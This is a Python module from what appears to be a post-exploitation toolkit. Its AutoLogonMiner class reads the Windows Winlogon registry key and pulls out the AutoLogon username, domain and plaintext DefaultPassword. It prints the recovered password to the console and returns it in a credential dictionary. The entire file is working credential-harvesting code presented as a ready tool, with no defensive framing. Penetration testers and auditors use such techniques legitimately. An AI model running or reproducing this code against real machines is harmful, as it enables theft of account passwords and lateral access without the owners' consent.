#!/usr/bin/env python3
"""
AutoLogon Credential Miner
Extract Windows AutoLogon credentials from registry
"""

import winreg
from typing import List, Dict, Optional

from ..utils import safe_open_key, safe_query_value


class AutoLogonMiner:
    """
    Extract AutoLogon credentials from Windows registry
    
    Location: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    Privilege: Requires local admin (HKLM access)
    """
    
    MINER_NAME = "autologon"
    REQUIRES_ADMIN = True
    
    def __init__(self):
        self.key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    
    def mine(self) -> List[Dict]:
        """
        Extract AutoLogon credentials
        
        Returns:
            List of credential dictionaries
        """
        print(f"\n[*] Mining AutoLogon credentials...")
        print(f"[*] Location: HKLM\\{self.key_path}")
        
        credentials = []
        
        key = safe_open_key(winreg.HKEY_LOCAL_MACHINE, self.key_path)
        
        if not key:
            print(f"[-] Cannot access Winlogon key (requires admin)")
            return credentials
        
        try:
            # Check if AutoLogon is enabled
            autologon_result = safe_query_value(key, "AutoAdminLogon")
            
            if not autologon_result or autologon_result[0] != "1":
                print(f"[-] AutoLogon is not enabled")
                return credentials
            
            print(f"[+] AutoLogon is enabled")
            
            # Extract credentials
            username_result = safe_query_value(key, "DefaultUserName")
            domain_result = safe_query_value(key, "DefaultDomainName")
            password_result = safe_query_value(key, "DefaultPassword")
            
            if username_result:
                username = username_result[0]
                domain = domain_result[0] if domain_result else ""
                password = password_result[0] if password_result else None
                
                cred = {
                    'source': 'AutoLogon',
                    'location': f'HKLM\\{self.key_path}',
                    'username': username,
                    'domain': domain,
                    'password': password if password else '[Not Stored]'
                }
                
                credentials.append(cred)
                
                print(f"[+] Found AutoLogon credentials:")
                print(f"    Domain: {domain if domain else '[Local]'}")
                print(f"    Username: {username}")
                
                if password:
                    print(f"    Password: {password}")
                else:
                    print(f"    Password: [Not stored in registry]")
            else:
                print(f"[-] AutoLogon enabled but username not found")
        
        finally:
            winreg.CloseKey(key)
        
        return credentials
    
    @staticmethod
    def get_info() -> Dict:
        """Get information about this miner"""
        return {
            'name': 'autologon',
            'description': 'Extract Windows AutoLogon credentials',
            'requires_admin': True,
            'requires_system': False,
            'registry_location': r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
            'credential_types': ['plaintext password'],
            'notes': [
                'AutoLogon stores credentials for automatic user logon',
                'Password is stored in plaintext in registry',
                'Requires local administrator privileges'
            ]
        }